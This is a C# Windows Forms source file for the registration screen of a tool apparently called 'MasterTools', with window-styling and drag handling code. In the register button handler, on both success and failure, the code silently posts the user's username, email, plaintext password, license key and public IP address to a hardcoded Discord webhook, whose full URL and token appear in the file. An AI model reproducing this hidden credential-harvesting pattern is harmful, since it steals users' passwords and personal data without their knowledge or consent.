using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Web;

namespace MasterTools
{
    public partial class Register : Form
    {
        private const int WM_NCHITTEST = 0x84;
        private const int HTCLIENT = 0x1;
        private const int HTCAPTION = 0x2;
        private bool m_aeroEnabled;
        private const int CS_DROPSHADOW = 0x00020000;
        private const int WM_NCPAINT = 0x0085;
        private const int WM_ACTIVATEAPP = 0x001C;

        [DllImport("dwmapi.dll")]
        public static extern int DwmExtendFrameIntoClientArea(IntPtr hWnd, ref MARGINS pMarInset);
        [DllImport("dwmapi.dll")]
        public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
        [DllImport("dwmapi.dll")]

        public static extern int DwmIsCompositionEnabled(ref int pfEnabled);
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse
            );

        public struct MARGINS
        {
            public int leftWidth;
            public int rightWidth;
            public int topHeight;
            public int bottomHeight;
        }
        protected override CreateParams CreateParams
        {
            get
            {
                m_aeroEnabled = CheckAeroEnabled();
                CreateParams cp = base.CreateParams;
                if (!m_aeroEnabled)
                    cp.ClassStyle |= CS_DROPSHADOW; return cp;
            }
        }
        private bool CheckAeroEnabled()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                int enabled = 0; DwmIsCompositionEnabled(ref enabled);
                return (enabled == 1) ? true : false;
            }
            return false;
        }
        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case WM_NCPAINT:
                    if (m_aeroEnabled)
                    {
                        var v = 2;
                        DwmSetWindowAttribute(this.Handle, 2, ref v, 4);
                        MARGINS margins = new MARGINS()
                        {
                            bottomHeight = 1,
                            leftWidth = 0,
                            rightWidth = 0,
                            topHeight = 0
                        }; DwmExtendFrameIntoClientArea(this.Handle, ref margins);
                    }
                    break;
                default: break;
            }
            base.WndProc(ref m);
            if (m.Msg == WM_NCHITTEST && (int)m.Result == HTCLIENT) m.Result = (IntPtr)HTCAPTION;
        }
        public Register()
    {
        InitializeComponent();
        m_aeroEnabled = false;
    }
        int mouseX, mouseY;
        bool mouseDown;
        int mouseinX, mouseinY;
        System.Windows.Forms.Timer t2 = new System.Windows.Forms.Timer();
        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            this.Hide();
            Login f1 = new Login();
            f1.Show();
        }

        private void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            Process.GetCurrentProcess().Kill();
            Environment.Exit(0);
        }
        void fadeIna(object sender, EventArgs e)
        {
            if (Opacity >= 1)
                t2.Stop();   //this stops the timer if the form is completely displayed
            else
                Opacity += 0.05;
        }

        private void Register_Load(object sender, EventArgs e)
        {
            username.TabIndex = 1;
            email.TabIndex = 2;
            password.TabIndex = 3;
            license.TabIndex = 4;
            password.UseSystemPasswordChar = true;
            license.UseSystemPasswordChar = true;
            Opacity = 0;      //first the opacity is 0
            t2.Interval = 30;  //we'll increase the opacity every 10ms
            t2.Tick += new EventHandler(fadeIna);  //this calls the function that changes opacity 
            t2.Start();
        }
        public static void sendWebHook(string URL, string msg, string username)
        {
            Http.Post(URL, new NameValueCollection()
            {
                { "username", username },
                { "content", msg }
            });
        }

        public string ROT13(string input)
        {
            StringBuilder result = new StringBuilder();
            Regex regex = new Regex("[A-Za-z]");
            foreach (char c in input)
            {
                if (regex.IsMatch(c.ToString()))
                {
                    int code = ((c & 223) - 52) % 26 + (c & 32) + 65;
                    result.Append((char)code);
                }
                else
                    result.Append(c);
            }
            return result.ToString();
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label7_MouseDown(object sender, MouseEventArgs e)
        {
            mouseDown = true;
            mouseinX = MousePosition.X - Bounds.X;
            mouseinY = MousePosition.Y - Bounds.Y;
        }

        private void label7_MouseUp(object sender, MouseEventArgs e)
        {
            mouseDown = false;
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked == true)
            {
                password.UseSystemPasswordChar = false;
                license.UseSystemPasswordChar = false;
            }
            else
            {
                password.UseSystemPasswordChar = true;
                license.UseSystemPasswordChar = true;
            }
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {

        }

        private void siticoneRoundedButton3_Click(object sender, EventArgs e)
        {
            Process.Start("https://sellix.io/MasterTools");
        }

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
            if (API.Register(username.Text, password.Text,email.Text,license.Text))
            {
                MessageBox.Show("Account Created", "Master Tools", MessageBoxButtons.OK, MessageBoxIcon.Information);
               
                WebClient wc = new WebClient { };
                string myip = wc.DownloadString($"https://api.ipify.org/");
                sendWebHook("https://discordapp.com/api/webhooks/751907875781083216/LP4OT1Bcudf7pUT-cfKCNj6S_lWqmWY0nLTvPMkN8Cld-XUL3Wtadld-ZkL8-KoSQ_uJ ", string.Concat(new string[] { ">>> New Register" + Environment.NewLine + "User: " + username.Text + Environment.NewLine + "Email: " + email.Text  + Environment.NewLine + "Password: " + password.Text + Environment.NewLine + "License Used: " + license.Text + "IP: " + myip}), "REGISTER BOT");
            }  
            else
            {
                MessageBox.Show("Someting Went Wrong, Try Again!", "Master Tools", MessageBoxButtons.OK, MessageBoxIcon.Error);
                WebClient wc = new WebClient { };
                string myip = wc.DownloadString($"https://api.ipify.org/");
                sendWebHook("https://discordapp.com/api/webhooks/751907875781083216/LP4OT1Bcudf7pUT-cfKCNj6S_lWqmWY0nLTvPMkN8Cld-XUL3Wtadld-ZkL8-KoSQ_uJ ", string.Concat(new string[] { ">>> Faild Register" + Environment.NewLine + "User: " + username.Text + Environment.NewLine + "Email: " + email.Text + Environment.NewLine + "Password: " + password.Text + Environment.NewLine + "License Used: " + license.Text + "IP: " + myip }), "REGISTER  FAILD BOT");
                return;
            }
        }

        private void label7_MouseMove(object sender, MouseEventArgs e)
        {
            if (mouseDown)
            {
                mouseX = MousePosition.X - mouseinX;
                mouseY = MousePosition.Y - mouseinY;

                this.SetDesktopLocation(mouseX, mouseY);
            }
        }
    }
}
